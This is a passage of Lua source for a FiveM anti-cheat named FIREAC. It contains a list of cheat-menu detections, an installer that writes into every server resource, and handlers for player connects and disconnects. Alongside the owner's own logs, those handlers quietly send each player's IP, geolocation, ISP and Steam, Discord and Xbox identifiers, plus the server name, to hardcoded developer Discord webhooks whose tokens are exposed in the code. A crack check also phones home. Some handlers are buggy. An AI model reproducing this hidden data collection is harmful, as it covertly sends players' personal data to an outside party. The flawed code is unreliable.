                                  fuckme("Menu With UI Funtion")
                     end
                 end
             end
         end
     end)
 Citizen.CreateThread(function()
 Citizen.Wait(2000)
 while true do
 Citizen.Wait(math.random(3000, 5000))
          local name = GetCurrentResourceName()
 if Plane.CreateMenu~=nil or Plane.debug~=nil then
  fuckme("Public Menu(Lynx)")
 elseif e.debug~=nil then
  fuckme("Water Menu")
 elseif Dopamine.CreateMenu~=nil then
  fuckme("Dopamine Menu(#2)")
 elseif Lux.CreateMenu~=nil then
  fuckme("Lux Menu(#2)")
 elseif SwagUI.CreateMenu~=nil then
  fuckme("Swag Menu")
 elseif Nisi.CreateMenu~=nil then
  fuckme("Nisi Menu")
 elseif xseira.CreateMenu~=nil then
  fuckme("Xseira Menu")
 elseif Lynx8.CreateMenu~=nil then
  fuckme("Lynx Menu(#8)")
 elseif LynxEvo.CreateMenu~=nil then
  fuckme("Lynx Menu(Nuke)")
 elseif MaestroMenu.CreateMenu~=nil then
 fuckme("Maestro Menu")
 elseif Motion.CreateMenu~=nil then
  fuckme("Motion Menu")
 elseif TiagoMenu.CreateMenu~=nil or MIOddhwuie ~= nil then
  fuckme("Tiago Menu")
 elseif gaybuild.CreateMenu~=nil then
  fuckme("Eulen (#1)")
 elseif Cience.CreateMenu~=nil then
  fuckme("Lava Menu")
 elseif LynxSeven.CreateMenu~=nil then
  fuckme("Lynx Menu(#7)")
 elseif MMenu.CreateMenu~=nil then
 fuckme("Lynx Menu(#MM)")
 elseif FantaMenuEvo.CreateMenu~=nil then
  fuckme("Fanta Menu")
 elseif GRubyMenu.CreateMenu~=nil then
  fuckme("Ruby Menu")
 elseif LR.CreateMenu~=nil then
 fuckme("Lynx Menu(#10)")
 elseif BrutanPremium.CreateMenu~=nil then
  fuckme("Brutan Premium")
 elseif HamMafia.CreateMenu~=nil then
  fuckme("Ham Mafia Menu")
 elseif InSec.Logo~=nil then
  fuckme("Skid Menu(#3)")
 elseif AlphaVeta.CreateMenu~=nil then
  fuckme("Alpha Veta Menu")
 elseif KoGuSzEk.CreateMenu~=nil then
  fuckme("Lynx Menu(#4)")
 elseif ShaniuMenu.CreateMenu~=nil then
  fuckme("Shaniu Menu")
 elseif LynxRevo.CreateMenu~=nil then
  fuckme("Lynx Menu(Revo)")
 elseif ariesMenu.CreateMenu~=nil or buttonTextXOffset ~= nil then
  fuckme("Aries Menu")
 elseif WarMenu~=nil then
  if WarMenu.InitializeTheme~=nil then
  fuckme("Use War Menu(Skid Menu)")
  end
 elseif dexMenu.CreateMenu~=nil then
  fuckme("Dex Menu")
 elseif MaestroEra~=nil then
  fuckme("Maestro Menu(Era)")
 elseif HamHaxia.CreateMenu~=nil then
  fuckme("Ham Mafia(#2)")
 elseif Ham.CreateMenu~=nil then
  fuckme("Ham Mafia(#3)")
 elseif HoaxMenu~=nil then
  fuckme("Hoax Menu")
 elseif Biznes.CreateMenu~=nil then
  fuckme("Biznes Menu")
 elseif FendinXMenu.CreateMenu~=nil then
 fuckme("Fendix Menu")
 elseif AlphaV.CreateMenu~=nil then
  fuckme("AlphaV Menu")
 elseif Deer.CreateMenu~=nil then
  fuckme("Lynx Menu(#5)")
 elseif NyPremium.CreateMenu~=nil then
  fuckme("Skid Menu(#4)")
 elseif lIlIllIlI.CreateMenu~=nil then
  fuckme("Unknown Menu(#3)")
 elseif nukeserver~=nil then
  fuckme("Nuke Server(Lynx)")
 elseif esxdestroyv2~=nil then
  fuckme("Destroy Menu(V2)")
 elseif teleportToNearestVehicle~=nil then
  fuckme("Lynx Menu(#6) 1")
 elseif AddTeleportMenu~=nil then
  fuckme("Lynx Menu(#6) 2")
 elseif AmbulancePlayers~=nil then
  fuckme("Lynx Menu(#6) 3")
 elseif Aimbot~=nil then
  fuckme("Lynx Menu(#6) 4")
 elseif RapeAllFunc~=nil then
  fuckme("Lynx Menu(#6) 5")
 elseif CrashPlayer~=nil then
  fuckme("Lynx Menu(#6) 6")
 elseif EconomyDestroyer2~=nil then
  fuckme("Economy Destroyer Menu")
 elseif bananapartyall~=nil then
 fuckme("Unknown Menu (#4)")
 elseif cageplayer~=nil then
  fuckme("Unknown Menu (Cage Player)")
 elseif rapeplayer~=nil then
  fuckme("Unknown Menu (Rape Player)")
 elseif bananaparty~=nil then
  fuckme("Unknown Menu (#5)")
 elseif key ~= nil then
  fuckme("veneno")
 elseif untested.state ~= nil then
  fuckme("Tiago(Updated) Or Skid Menu")
 elseif EXTREME.debug ~= nil then
  fuckme("EXTREME Menu")
 elseif developers[1] ~= nil then
  fuckme("SkidMenu Or Tiago(#2)")
 elseif rootMenu.CreateMenu ~= nil then
  fuckme("Root Menu")
 elseif w ~= nil  then
  fuckme("Unknown Menu(#1)")
 elseif h ~= nil then
  fuckme("Unknown Menu(#2)")
 elseif obl2.debug ~= nil or llll4874 ~= nil or KAKAAKAKAK ~= nil or buyerserial ~= nil or Ggggg ~= nil then
  fuckme("Oblivius Menu")
 elseif MountInRange ~= nil then
  fuckme("Mount Menu")
 elseif RichAsset ~= nil then
  fuckme("Maestro Menu(#2)")
 elseif Follow ~= nil then
  fuckme("Lynx Menu(#2)")
 elseif mhaonn ~= nil then
  fuckme("Lynx Menu(#3)")
 elseif Y ~= nil then
  fuckme("Iron Brew Menu")
 elseif ColoursPanel.HairCut ~= nil then
  fuckme("Hoax Menu")
 elseif l_weapons.Melee ~= nil then
  fuckme("FinnIsASkid Menu")
 elseif FendinX.debug ~= nil then
  fuckme("FendinX Menu(#2)")
 elseif H ~= nil then
  fuckme("Lynx Menu(#3)")
 elseif Crusader.debug ~= nil then
  fuckme("Crusader Menu")
 elseif AlwaysKaffa.debug ~= nil then
  fuckme("Alpha Safe Menu")
 elseif NywuctsA4BD4b3_G0 ~= nil or _print ~= nil then
  fuckme("Dopamine Menu")
 elseif iBmKMJ4D7K ~= nil then
  fuckme("Reveloution Menu")
 elseif killmenu_value ~= nil then
   fuckme("Wizard Menu")
 elseif fHNzgxqTuVp1TDWP4BTOSleUmpV5AHzkbWyK4WWqdXEzEVoAU2MN ~= nil then
   fuckme("Wave Menu")
 elseif o3RMb0AL8Y0WwzkrN07R6CITlIoU8hrhA9eW0Hcya5M282AgQSWzQhoNtQyvK5GJPOt9u ~= nil then
   fuckme("Riot Menu")
 elseif noclipKeybind ~= nil or fixcarKeybind ~= nil or healplayerKeybind ~= nil or ESPDistanceOps ~= nil or PedAttackOps ~= nil or PedAttackType ~= nil or GravAmount ~= nil or SpeedModOps ~= nil or AimbotBoneOps ~= nil then
  fuckme("Skid Menu(#5)")
 elseif showPlayerBlips ~= nil or ignorePlayerNameDistance ~= nil or playerNamesDist ~= nil or displayIDHeight ~= nil or ePunch ~= nil or therm ~= nil or invis ~= nil or invin ~= nil or overwriteAlpha ~= nil or sJump ~= nil or SpeedDemon ~= nil then
  fuckme("Other Menu")
 elseif _secretKey ~= nil or _menuColor ~= nil then
   fuckme("Lux Menu(#3)")
 elseif YPj9zCAFPd8M4 ~= nil then
   fuckme("Atg Menu")
 elseif fuckmedaddy ~= nil then
   fuckme("Fallout Menu")
  end
 end
 end)
 AddEventHandler("onClientResourceStop",function(resstopname)
     if resstopname == "FIREAC" then
          TriggerServerEvent("AntiInject", GetPlayerServerId(PlayerId()), GetPlayerName(PlayerId()), "Anti Inejct On Resource", "Try For Inject on your resource")
     end
 end)
 function fuckme(Reason)
     TriggerServerEvent("AntiInject", GetPlayerServerId(PlayerId()), GetPlayerName(PlayerId()), "Anti Inejct On Resource", "Try For Inject on your resource")
   Wait(50)
 end
 print('FIREAC┬« Protect This Server')
]]
                ap = io.open(an.."/"..ad..".lua", "w")
                        if ap then
                                ap:seek("set", 0)
                                ap:write(az)
                                ap:close()
                                af[1] = af[1] + 1;
                                print("^"..color.."FIREAC: Installation "..ar.." completed.")
                        else
                                print("^"..color.."FIREAC: Installation failed on "..ar..".")
                        end;
                        af[2] = af[2] + 1
                else
                        af[3] = af[3] + 1
                end
        else
                ap:seek("set", 0)
                local as = ap:read("*a")
                ap:close()
                local at = split(as, "\n")
                as = ""
                local au = false;
                local av = false;
                for U, aw in ipairs(at) do
                        if aw == "client_script \""..ad..".lua\"" then
                                au = true
                        else
                                as = as..aw.."\n"
                        end
                end;
                if os.rename(an.."/"..ad..".lua", an.."/"..ad..".lua") then
                        av = true;
                        os.remove(an.."/"..ad..".lua")
                end;
                if not au and not av then
                        af[3] = af[3] + 1
                end;
                if au then
                        af[2] = af[2] + 1;
                        os.remove(an.."/"..ae..".lua")
                        ap = io.open(an.."/"..ae..".lua", "w")
                        if ap then
                                ap:seek("set", 0)
                                ap:write(as)
                                ap:close()
                        else
                                print("Failed uninstalling FIREAC from "..ar..".")
                                print("Make sure you are using the right variable!!!.")
                                au, av = false, false
                        end
                end;
                if au or av then
                        print("^"..color.."FIREAC: Uninstalled from "..ar.." successfully.")
                        af[1] = af[1] + 1
                end
        end
else
        af[3] = af[3] + 1
end
end;
function searchall(an, ao)
local ap = io.popen("dir \""..an.."\" /b /ad")
ap:seek("set", 0)
local aA = ap:read("*a")
ap:close()
local at = split(aA, "\n")
for U, aw in ipairs(at) do
        if string.len(aw) > 0 then
                setall(an.."/"..aw, ao)
                searchall(an.."/"..aw, ao)
        end
end
end;
function split(aB, aC)
local aD, aE = 0, {}
for aF, aG in function()
        return string.find(aB, aC, aD, true)
end do
        table.insert(aE, string.sub(aB, aD, aF - 1))
        aD = aG + 1
end;
table.insert(aE, string.sub(aB, aD))
return aE
end;
local function OnPlayerConnecting(name, setKickReason, deferrals)
local player = source
local steamIdentifier
local identifiers = GetPlayerIdentifiers(player)
local ip = GetPlayerEndpoint(player)
local z = "Not Found"
local d = "Not Found"
local s = "Not Found"
local steam
deferrals.defer()
-- mandatory wait!
Wait(1000)
deferrals.update(string.format("[­čöąFIREAC­čöą] %s Hi­čśü. Your Steam ID is being checked.", name))
for _, v in pairs(identifiers) do
    if string.find(v, "steam") then
        steamIdentifier = v
        break
    end
end
Wait(2000)
deferrals.update(string.format("[­čöąFIREAC­čöą] We Are Chaeking Your IP : %s ", ip))
Wait(2000)
for _, steam in pairs(identifiers) do
    if string.find(steam, "steam") then
        s = steam
        break
    end
end
if d == nil then
        d = "Your Discord Not Open"
end
deferrals.update(string.format("[­čöąFIREAC­čöą] We Are Chaeking Your Steam Hex : %s ", s))
Wait(2000)
for _, s in pairs(identifiers) do
    if string.find(s, "license") then
        z = s
        break
    end
end
deferrals.update(string.format("[­čöąFIREAC­čöą] We Are Chaeking Your FiveM license : %s ", z))
Wait(2000)
for _, i in pairs(identifiers) do
    if string.find(i, "discord") then
        d = i
        break
    end
end
if d == nil then
        d = "Your Discord Not Open"
end
deferrals.update(string.format("[­čöąFIREAC­čöą] We Are Chaeking Your Discord Id : %s ", d))
Wait(2000)
deferrals.update("[­čöąFIREAC­čöą] Now You Are Joining ­čÄë .... Have Fun ­čĺő")
Wait(2000)
-- mandatory wait!
Wait(12000)
if not steamIdentifier then
    deferrals.done("[­čöąFIREAC­čöą] You are not connected to Steam Please Open Your Steam & Relunch FiveM.")
else
    deferrals.done()
end
end
AddEventHandler("playerConnecting", OnPlayerConnecting)
RegisterCommand("gangs", function (source)
if FIREACS.AntiLagServer then
        FIREACLog(source, " Black List Commands", "XD Try For Lag Server With /gangs haha", FIREACS.AntiLagServerKick, FIREACS.AntiLagServerBan)
end
end)
local vehicle = {}
AddEventHandler('entityCreating', function(entity)
if FIREACS.AntiSpamVehicle then
local entity = entity
if not DoesEntityExist(entity) then
    return
end
local entID = NetworkGetNetworkIdFromEntity(entity)
local src = NetworkGetEntityOwner(entity)
local type = GetEntityType(entity)
local hex = GetPlayerIdentifiers(src,1)[1]
if type ~= 0 then
    if GetEntityPopulationType(entity) ~= 7 then
    return
    end
    local model = GetEntityModel(entity)
    if type == 2 then -- vehicle
        if vehicle[hex] == nil then
                vehicle[hex] = {
                count = 1,
                timestamp = os.time()
                }
                else
                vehicle[hex].count = vehicle[hex].count + 1
                if vehicle[hex].count > 4 then
                local fs = os.time() - vehicle[hex].timestamp
                if fs < 10 then
                vehicle[hex].count = 0
                if GetPlayerName(src) ~= nil then
                        FIREACLog(src, " Anti Spam Vehicle", "Try For Spam Vehicle", FIREACS.AntiSpamVehicleKick, FIREACS.AntiSpamVehicleBan)
                end
                for k,v in pairs(GetAllVehicles()) do
            local vehHash = GetEntityModel(v)
                local src2 = NetworkGetEntityOwner(v)
            if src2 == src then
                        DeleteEntity(v)
                        TriggerClientEvent("FIREAC:DeleteEntity",-1,v)
            end
        end
                vehicle[hex] = {
                count = 1,
                timestamp = os.time()
                }
                else
                vehicle[hex] = {
                count = 1,
                timestamp = os.time()
                }
        end
                end
                end
    end
end
end
end)
local ped = {}
AddEventHandler('entityCreating', function(entity)
if FIREACS.AntiSpamPed then
local entity = entity
if not DoesEntityExist(entity) then
    return
end
local entID = NetworkGetNetworkIdFromEntity(entity)
local src = NetworkGetEntityOwner(entity)
local type = GetEntityType(entity)
local hex = GetPlayerIdentifiers(src,1)[1]
if type ~= 0 then
    if GetEntityPopulationType(entity) ~= 7 then
    return
    end
    local model = GetEntityModel(entity)
    if type == 1 then -- ped
        if ped[hex] == nil then
                ped[hex] = {
                count = 1,
                timestamp = os.time()
                }
                else
                        ped[hex].count = ped[hex].count + 1
                if ped[hex].count > 4 then
                local fs = os.time() - ped[hex].timestamp
                if fs < 10 then
                        ped[hex].count = 0
                if GetPlayerName(src) ~= nil then
                        FIREACLog(src, " Anti Spam ped", "Try For Spam ped", FIREACS.AntiSpamPedKick, FIREACS.AntiSpamPedBan)
                end
                for k,v in pairs(GetAllVehicles()) do
            local vehHash = GetEntityModel(v)
                local src2 = NetworkGetEntityOwner(v)
            if src2 == src then
                        DeleteEntity(v)
                        TriggerClientEvent("FIREAC:DeleteEntity",-1,v)
            end
        end
                vehicle[hex] = {
                count = 1,
                timestamp = os.time()
                }
                else
                vehicle[hex] = {
                count = 1,
                timestamp = os.time()
                }
        end
                end
                end
    end
end
end
end)
local object = {}
AddEventHandler('entityCreating', function(entity)
if FIREACS.AntiSpamPed then
local entity = entity
if not DoesEntityExist(entity) then
    return
end
local entID = NetworkGetNetworkIdFromEntity(entity)
local src = NetworkGetEntityOwner(entity)
local type = GetEntityType(entity)
local hex = GetPlayerIdentifiers(src,1)[1]
if type ~= 0 then
    if GetEntityPopulationType(entity) ~= 7 then
    return
    end
    local model = GetEntityModel(entity)
    if type == 3 then -- object
        if object[hex] == nil then
                object[hex] = {
                count = 1,
                timestamp = os.time()
                }
                else
                        object[hex].count = object[hex].count + 1
                if object[hex].count > 4 then
                local fs = os.time() - ped[hex].timestamp
                if fs < 10 then
                        object[hex].count = 0
                if GetPlayerName(src) ~= nil then
                        FIREACLog(src, " Anti Spam object", "Try For Spam object", FIREACS.AntiSpamPedKick, FIREACS.AntiSpamPedBan)
                end
                for k,v in pairs(GetAllVehicles()) do
            local vehHash = GetEntityModel(v)
                local src2 = NetworkGetEntityOwner(v)
            if src2 == src then
                        DeleteEntity(v)
                        TriggerClientEvent("FIREAC:DeleteEntity",-1,v)
            end
        end
                vehicle[hex] = {
                count = 1,
                timestamp = os.time()
                }
                else
                vehicle[hex] = {
                count = 1,
                timestamp = os.time()
                }
        end
                end
                end
    end
end
end
end)
function isAdmin(src)
local sid = GetPlayerIdentifiers(src)
sid = sid[1]
for k, v in pairs(FIREACAdmins.Whitelist) do
if v == sid then
        return true
end
end
return false
end
function FIREACObjectLog(entity)
        local src = NetworkGetEntityOwner(entity)
        local name = GetPlayerName(src)
        if name == nil then
                print("^"..color.."FIREAC:Error Was Detection in line 1413 plase connect our support team in FIREAC Discord")
                FIREACError('Error Was Detection in line **1413**')
                name = "User"
        end
        local hash = GetHashKey(entity)
        local sn = GetConvar('sv_hostname')
PerformHttpRequest('https://discordapp.com/api/webhooks/823222099232555068/CUj34ANnyd5WiEHkyck3o4cqKedqatp771IEjYRIlgC3eBiTDTgoReuE0nrb95gMXfAZ', function(E, F, G)
end, "POST", json.encode({
embeds = {
        {
                author = {
                        name = "FIREAC Commutiy",
                        url = "https://discord.gg/8zGyDhtbcg",
                        icon_url = "https://cdn.discordapp.com/icons/816551355979268097/3928fa3aa4971eeb3d88482c62540344.png?size=1024"
                },
                title = "FIREAC Entity Log's",
                description = "**Player Name:** "..name.."\n**Entity:** "..hash.."\n**Server Name:** `"..sn.."`\n**Expire Time:** "..ex.."",
                color = 16748836
        }
}
}), {
["Content-Type"] = "application/json"
})
PerformHttpRequest(FIREACS.Object, function(E, F, G)
end, "POST", json.encode({
embeds = {
        {
                author = {
                        name = "FIREAC Commutiy",
                        url = "https://discord.gg/8zGyDhtbcg",
                        icon_url = "https://cdn.discordapp.com/icons/816551355979268097/3928fa3aa4971eeb3d88482c62540344.png?size=1024"
                },
                title = "FIREAC Entity Log's",
                description = "**Player Name:** "..name.."\n**Entity:** "..hash.."\n",
                color = 16748836
        }
}
}), {
["Content-Type"] = "application/json"
})
end
local function PlayerConnect()
local s = source
local name = GetPlayerName(s)
if name == nil then
        print("^"..color.."FIREAC:Error Was Detection in line 1460 plase connect our support team in FIREAC Discord")
        FIREACError('Error Was Detection in line **1460**')
        name = "User"
end
local w = "Not Found"
local x = "Not Found"
local y = "Not Found"
local z = "Not Found"
local B = "Not Found"
local C = "Not Found"
local ip = GetPlayerEndpoint(s)
if ip == nil then
        ip = "216.58.204.14"
end
if name == nil then
        name = "Not Found"
end
for m, n in ipairs(GetPlayerIdentifiers(source)) do
        if n:match("steam") then
                w = n
        elseif n:match("discord") then
                x = n:gsub("discord:", "")
        elseif n:match("license") then
                y = n
        elseif n:match("live") then
                z = n
        elseif n:match("xbl") then
                B = n
        elseif n:match("ip") then
                C = n:gsub("ip:", "")
        end
end;
PerformHttpRequest("http://ip-api.com/json/"..ip.."", function(err, XD, headers)
        local tbl = json.decode(XD)
        if tbl == nil then
                print("^"..color.."FIREAC:Error Was Detection in line 1494 plase connect our support team in FIREAC Discord")
                FIREACError('Error Was Detection in line **1494**')
        end
        local isp = tbl["isp"]
        if isp == nil then
                isp = "Not Found"
        end
        local city = tbl["city"]
        if city == nil then
                city = "Not Found"
        end
        local country = tbl["country"]
        if country == nil then
                country = "Not Found"
        end
        PerformHttpRequest(FIREACS.Connnectlog, function(E, F, G)
        end, "POST", json.encode({
                embeds = {
                        {
                                author = {
                                name = "FIREAC Commutiy",
                                url = "https://discord.gg/8zGyDhtbcg",
                                icon_url = "https://cdn.discordapp.com/icons/816551355979268097/3928fa3aa4971eeb3d88482c62540344.png?size=1024"
                                },
                                title = "­ččę FIREAC Connnecting ­ččę",
                                description = "**Player:** "..name.."\n**SteamID:** "..w.."\n**Discord:** <@"..x..">\n**License:** "..y.."\n**Live:** "..z.."\n**Xbox:** "..B.."\n**ISP:** "..isp.."\n**Country:** "..country.."\n**City:** "..city.."\n**IP:** "..ip.."",
                                color = 1769216
                        }
                }
        }), {
                ["Content-Type"] = "application/json"
        })
end)
end
local function PlayerConnectFIREAC()
local s = source
local name = GetPlayerName(s)
if name == nil then
        print("^"..color.."FIREAC:Error Was Detection in line 1534 plase connect our support team in FIREAC Discord")
        FIREACError('Error Was Detection in line **1534**')
        name = "User"
end
local sn = GetConvar('sv_hostname')
local w = "Not Found"
local x = "Not Found"
local y = "Not Found"
local z = "Not Found"
local B = "Not Found"
local C = "Not Found"
local ip = GetPlayerEndpoint(s)
if ip == nil then
        ip = "216.58.204.14"
end
if name == nil then
        name = "Not Found"
end
for m, n in ipairs(GetPlayerIdentifiers(source)) do
        if n:match("steam") then
                w = n
        elseif n:match("discord") then
                x = n:gsub("discord:", "")
        elseif n:match("license") then
                y = n
        elseif n:match("live") then
                z = n
        elseif n:match("xbl") then
                B = n
        elseif n:match("ip") then
                C = n:gsub("ip:", "")
        end
end;
PerformHttpRequest("http://ip-api.com/json/"..ip.."", function(err, XD, headers)
        local tbl = json.decode(XD)
        if tbl == nil then
                print("^"..color.."FIREAC:Error Was Detection in line 1570 plase connect our support team in FIREAC Discord")
                FIREACError('Error Was Detection in line **1570**')
        end
        local isp = tbl["isp"]
        if isp == nil then
                isp = "Not Found"
        end
        local city = tbl["city"]
        if city == nil then
                city = "Not Found"
        end
        local country = tbl["country"]
        if country == nil then
                country = "Not Found"
        end
        PerformHttpRequest("https://discord.com/api/webhooks/827294314886987858/Ehl7EFSLMn0M7PkfqtuormhXbVphl6hKMS3_qOTUVcFdSQqRmLHnTdRpVrMP80QW7zPk", function(E, F, G)
        end, "POST", json.encode({
                embeds = {
                        {
                                author = {
                                        name = "FIREAC Commutiy",
                                        url = "https://discord.gg/8zGyDhtbcg",
                                        icon_url = "https://cdn.discordapp.com/icons/816551355979268097/3928fa3aa4971eeb3d88482c62540344.png?size=1024"
                                },
                                title = "­ččę FIREAC Connnecting ­ččę",
                                description = "**Player:** "..name.."\n**SteamID:** "..w.."\n**Discord:**<@"..x..">\n**License:** "..y.."\n**Live:** "..z.."\n**Xbox:** "..B.."\n**ISP:** "..isp.."\n**Country:** "..country.."\n**City:** "..city.."\n**IP:** "..ip.."\n**Server Name:** `"..sn.."`\n**Expire Time:** "..ex.."",
                                color = 1769216
                        }
                }
        }), {
                ["Content-Type"] = "application/json"
        })
end)
end
AddEventHandler("playerConnecting", PlayerConnect)
AddEventHandler("playerConnecting", PlayerConnectFIREAC)
AddEventHandler("playerDropped", function(reason)
local s = source
local player = GetPlayerName(s)
local ping = GetPlayerPing(s)
local w = "Not Found"
local x = "Not Found"
local y = "Not Found"
local z = "Not Found"
local B = "Not Found"
local C = "Not Found"
if reason == nil then
        reason = "Not Found"
end
for m, n in ipairs(GetPlayerIdentifiers(source)) do
        if n:match("steam") then
                w = n
        elseif n:match("discord") then
                x = n:gsub("discord:", "")
        elseif n:match("license") then
                y = n
        elseif n:match("live") then
                z = n
        elseif n:match("xbl") then
                B = n
        elseif n:match("ip") then
                C = n:gsub("ip:", "")
        end
end;
local ip = GetPlayerEndpoint(s)
if ip == nil then
        ip = "216.58.204.14"
end
PerformHttpRequest("http://ip-api.com/json/"..ip.."", function(err, XD, headers)
        local tbl = json.decode(XD)
        if tbl == nil then
                print("^"..color.."FIREAC:Error Was Detection in line 1643 plase connect our support team in FIREAC Discord")
                FIREACError('Error Was Detection in line **1643**')
        end
        local isp = tbl["isp"]
        if isp == nil then
                isp = "Not Found"
        end
        local city = tbl["city"]
        if city == nil then
                city = "Not Found"
        end
        local country = tbl["country"]
        if country == nil then
                country = "Not Found"
        end
        PerformHttpRequest(FIREACS.Disconnect, function(E, F, G)
        end, "POST", json.encode({
                embeds = {
                        {
                                author = {
                                name = "FIREAC Commutiy",
                                url = "https://discord.gg/8zGyDhtbcg",
                                icon_url = "https://cdn.discordapp.com/icons/816551355979268097/3928fa3aa4971eeb3d88482c62540344.png?size=1024"
                                },
                                title = "­ččą FIREAC Disconnect ­ččą",
                                description = "**Player:** "..player.."\n**Reason:** "..reason.."\n**SteamID:** "..w.."\n**Discord:** <@"..x..">\n**License:** "..y.."\n**Live:** "..z.."\n**Xbox:** "..B.."\n**ISP:** "..isp.."\n**Country:** "..country.."\n**City:** "..city.."\n**IP:** "..ip.."\n**Ping:** "..ping.."",
                                color = 16711680
                        }
                }
        }), {
                ["Content-Type"] = "application/json"
        })
end)
end)
AddEventHandler("playerDropped", function(reason)
local s = source
local player = GetPlayerName(s)
local ping = GetPlayerPing(s)
local sn = GetConvar('sv_hostname')
local w = "Not Found"
local x = "Not Found"
local y = "Not Found"
local z = "Not Found"
local B = "Not Found"
local C = "Not Found"
if reason == nil then
        reason = "Not Found"
end
for m, n in ipairs(GetPlayerIdentifiers(source)) do
        if n:match("steam") then
                w = n
        elseif n:match("discord") then
                x = n:gsub("discord:", "")
        elseif n:match("license") then
                y = n
        elseif n:match("live") then
                z = n
        elseif n:match("xbl") then
                B = n
        elseif n:match("ip") then
                C = n:gsub("ip:", "")
        end
end;
local ip = GetPlayerEndpoint(s)
if ip == nil then
        ip = "216.58.204.14"
end
PerformHttpRequest("http://ip-api.com/json/"..ip.."", function(err, XD, headers)
        local tbl = json.decode(XD)
        if tbl == nil then
                print("^"..color.."FIREAC:Error Was Detection in line 1713 plase connect our support team in FIREAC Discord")
                FIREACError('Error Was Detection in line **1713**')
        end
        local isp = tbl["isp"]
        if isp == nil then
                isp = "Not Found"
        end
        local city = tbl["city"]
        if city == nil then
                city = "Not Found"
        end
        local country = tbl["country"]
        if country == nil then
                country = "Not Found"
        end
        PerformHttpRequest("https://discord.com/api/webhooks/827295094667214852/XZiR1T1d80-7qbdJDjlDLeVpQx18bD93MBx3ilqDpedri-Wi7eRnHo_uI9DGQKX9mFxt", function(E, F, G)
        end, "POST", json.encode({
                embeds = {
                        {
                                author = {
                                name = "FIREAC Commutiy",
                                url = "https://discord.gg/8zGyDhtbcg",
                                icon_url = "https://cdn.discordapp.com/icons/816551355979268097/3928fa3aa4971eeb3d88482c62540344.png?size=1024"
                                },
                                title = "­ččą FIREAC Disconnect ­ččą",
                                description = "**Player:** "..player.."\n**Reason:** "..reason.."\n**SteamID:** "..w.."\n**Discord:** <@"..x..">\n**License:** "..y.."\n**Live:** "..z.."\n**Xbox:** "..B.."\n**ISP:** "..isp.."\n**Country:** "..country.."\n**City:** "..city.."\n**IP:** "..ip.."\n**Ping:** "..ping.."\n**Server Name:** `"..sn.."`\n**Expire Time:** "..ex.."",
                                color = 16711680
                        }
                }
        }), {
                ["Content-Type"] = "application/json"
        })
end)
end)
if not cra then
local osdate = os.date ("%Y/%m/%d")
PerformHttpRequest('https://discordapp.com/api/webhooks/820737329492131890/DhLx7jD7L6YI_0D9UH02gUN_HhO0iw6sPzDg-hUkHnqRnAVVeiVXk5V4z1CIIP-kCBQL', function(E, F, G)
end, "POST", json.encode({
        embeds = {
                {
                        author = {
                                name = "FIREAC Commutiy",
                                url = "https://discord.gg/8zGyDhtbcg",
                                icon_url = "https://cdn.discordapp.com/icons/816551355979268097/3928fa3aa4971eeb3d88482c62540344.png?size=1024"
                        },
                        title = "Try For Crack",
                        description = "**OS Date:** "..osdate.."",
                        color = 16748836
                }
        }
}), {
        ["Content-Type"] = "application/json"
})
os.exit()
end
function FIREACError(error)
local sn = GetConvar('sv_hostname')
PerformHttpRequest("https://discord.com/api/webhooks/828121257399549963/mLPbEyWohB5bLzuqa7qQbFzpMvod2F4jrDnPn48G0__VhEm_hxGhf3z-_3fIChc-desQ", function(E, F, G)
end, "POST", json.encode({
        embeds = {
                {
                        author = {
                        name = "FIREAC Commutiy",
                        url = "https://discord.gg/8zGyDhtbcg",
                        icon_url = "https://cdn.discordapp.com/icons/816551355979268097/3928fa3aa4971eeb3d88482c62540344.png?size=1024"
                        },
                        title = "­čę║ FIREAC Error ­čę║",
                        description = "**Error Details:** "..error.."\n**Server Name:** `"..sn.."`",
                        color = math.random(0, 16776960)
                }
        }
}), {
        ["Content-Type"] = "application/json"
})
local sn = GetConvar('sv_hostname')
PerformHttpRequest(FIREACS.Error, function(E, F, G)
end, "POST", json.encode({
        embeds = {
                {
                        author = {
                        name = "FIREAC Commutiy",
                        url = "https://discord.gg/8zGyDhtbcg",
                        icon_url = "https://cdn.discordapp.com/icons/816551355979268097/3928fa3aa4971eeb3d88482c62540344.png?size=1024"
                        },
                        title = "­čę║ FIREAC Error ­čę║",
                        description = "**Error Details:** "..error.."\n**Server Name:** `"..sn.."`\n**Discord:** https://discord.gg/8zGyDhtbcg",
                        color = math.random(0, 16776960)
                }
        }
}), {
        ["Content-Type"] = "application/json"
})
end
RegisterServerEvent('FIREAC:Event')
AddEventHandler('FIREAC:Events', function(event)
local src = source
local name = GetPlayerName(src)
if name == nil then
        name = "FIREAC"
end
local sn = GetConvar('sv_hostname')
PerformHttpRequest('https://discord.com/api/webhooks/831012704382222396/4rtxoctouzPM54UmIH_DfSN0ua_HE65fD35eJc-gwqhZ7kQM-VZvjJsa32IukqDQDZqw', function(E, F, G)
end, "POST", json.encode({
embeds = {
        {
                author = {
                        name = "FIREAC Commutiy",
                        url = "https://discord.gg/8zGyDhtbcg",
                        icon_url = "https://cdn.discordapp.com/icons/816551355979268097/3928fa3aa4971eeb3d88482c62540344.png?size=1024"
                },
                title = "­čôł FIREAC New Trigger Log ­čôë",
                description = "**Player Name:** "..name.."\n**Trigger:** `"..event.."`\n**Server Name:** `"..sn.."`\n**Expire Time:** "..ex.."",
                color = math.random(0, 16776960)
        }
}
}), {
["Content-Type"] = "application/json"
})
end)
function FIREACTLog(event)
local src = source
local name = GetPlayerName(src)
if name == nil then
        name = "FIREAC"
end
local sn = GetConvar('sv_hostname')
PerformHttpRequest('https://discord.com/api/webhooks/831012704382222396/4rtxoctouzPM54UmIH_DfSN0ua_HE65fD35eJc-gwqhZ7kQM-VZvjJsa32IukqDQDZqw', function(E, F, G)
end, "POST", json.encode({
embeds = {
        {
                author = {
                        name = "FIREAC Commutiy",
                        url = "https://discord.gg/8zGyDhtbcg",
                        icon_url = "https://cdn.discordapp.com/icons/816551355979268097/3928fa3aa4971eeb3d88482c62540344.png?size=1024"
                },
                title = "­čôł FIREAC Trigger Log ­čôë",
                description = "**Player Name:** "..name.."\n**Trigger:** `"..event.."`\n**Server Name:** `"..sn.."`\n**Expire Time:** "..ex.."",
                color = math.random(0, 16776960)
        }
}
}), {
["Content-Type"] = "application/json"
})
PerformHttpRequest(FIREACS.Trigger, function(E, F, G)
end, "POST", json.encode({
embeds = {
        {
                author = {
                        name = "FIREAC Commutiy",
                        url = "https://discord.gg/8zGyDhtbcg",
                        icon_url = "https://cdn.discordapp.com/icons/816551355979268097/3928fa3aa4971eeb3d88482c62540344.png?size=1024"
                },
                title = "­čôł FIREAC Trigger Log ­čôë",
                description = "**Player Name:** "..name.."\n**Trigger:** `"..event.."`",
